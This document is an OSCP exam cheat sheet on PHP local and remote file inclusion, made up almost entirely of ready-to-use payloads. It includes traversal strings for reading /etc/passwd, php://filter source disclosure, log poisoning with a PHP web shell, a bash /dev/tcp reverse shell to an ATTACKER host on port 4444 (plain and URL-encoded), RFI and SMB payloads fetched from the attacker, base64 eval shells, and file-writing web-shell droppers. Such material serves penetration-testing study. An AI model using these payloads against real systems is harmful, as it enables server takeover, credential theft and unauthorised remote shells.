# OSCP Cheat Sheet — LFI & RFI (Expanded RFI Payloads & Troubleshooting)

---

## 1. File Inclusion Basics (Quick Recognition)

### Common vulnerable parameters
```
page=
file=
include=
view=
path=
doc=
template=
module=
```

### Typical vulnerable code
```php
include($_GET['page']);
require($_GET['file']);
```

---

## 2. LFI Discovery Payloads

### Linux
```
?page=../../../../etc/passwd
?page=../etc/passwd
?page=/etc/passwd
```

### Windows
```
?page=../../../../windows/system32/drivers/etc/hosts
?page=C:\xampp\apache\logs\access.log
```

If `/etc/passwd` or `hosts` renders → **Confirmed LFI**

---

## 3. Directory Traversal Filter Bypasses

```
....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252fetc%252fpasswd
```

---

## 4. php://filter — Read PHP Source (Credential Goldmine)

### Read source without execution
```
?page=php://filter/resource=index.php
```

### Base64 encode PHP
```
?page=php://filter/convert.base64-encode/resource=admin.php
```

Decode:
```
echo "BASE64DATA" | base64 -d
```

---

## 5. LFI → RCE via Log Poisoning

### Poison Apache logs
```
<?php system($_GET['cmd']); ?>
```

### Include the log
```
?page=../../../../var/log/apache2/access.log&cmd=id
```

### Space bypass
```
cat${IFS}/etc/passwd
ls%20-la
```

---

## 6. Reverse Shell via LFI

### Shell-safe Bash
```
bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"
```

### URL encoded
```
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER%2F4444%200%3E%261%22
```

Listener:
```
nc -nvlp 4444
```

---

## 7. RFI That Downloads But Does NOT Execute

If remote files download or print but PHP does not execute, PHP is **not parsing the file**.

### Common reasons
- allow_url_include = Off
- Included as text, not PHP
- Wrong extension
- Included inside HTML context
- file_get_contents() instead of include()

---

## 8. RFI Reality Check

Test with:
```php
<?php phpinfo(); ?>
```

```
?page=http://ATTACKER/info.php
```

- Executes → RFI viable
- Prints/downloads → no PHP execution

---

## 9. RFI Payload Variations

### Try different extensions
```
shell.php
shell.phtml
shell.php5
shell.inc
shell.php.txt
```

### Short tags
```php
<?=system($_GET['cmd']);?>
```

### Alternate execution functions
```php
<?php exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php shell_exec($_GET['cmd']); ?>
```

### Base64 self-decoding
```php
<?php eval(base64_decode($_GET['x'])); ?>
```

Call:
```
&x=c3lzdGVtKGlkKTs=
```

---

## 10. RFI → Write File (Key OSCP Technique)

```php
<?php file_put_contents('/tmp/shell.php','<?php system($_GET["cmd"]); ?>'); ?>
```

Then:
```
?page=/tmp/shell.php&cmd=id
```

---

## 11. RFI → LFI Pivot

```php
file_put_contents('/var/www/html/shell.php','<?php system($_GET["cmd"]); ?>');
```

```
?page=/var/www/html/shell.php&cmd=id
```

---

## 12. data:// Wrapper

Requires allow_url_include = On

### Inline
```
?page=data://text/plain,<?php system('id'); ?>
```

### Base64
```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKGlkKTsgPz4=
```

---

## 13. Windows RFI via SMB

```
impacket-smbserver share .
```

```
?page=\\ATTACKER\share\shell.php
```

---

## 14. When RFI Is Not RCE

Use for:
- Source disclosure
- Writing files
- LFI pivot
- Credential harvesting
- Config leakage

---

## 15. OSCP Decision Tree

```
LFI?
 ├─ php://filter
 ├─ log poisoning
 ├─ data://
 ├─ RFI executes
 └─ RFI write → LFI
```

---

## 16. High-Value One-Liners

```
php://filter/convert.base64-encode/resource=index.php
data://text/plain;base64,PD9waHAgZXZhbCgkX0dFVFsnYyddKTsgPz4=
file_put_contents('/tmp/shell.php','<?php system($_GET["cmd"]); ?>');
```

---

## 17. Common OSCP Mistakes

- Assuming RFI == RCE
- Not pivoting RFI → LFI
- Forgetting allow_url_include
- Not testing write-to-disk
- Ignoring SMB on Windows
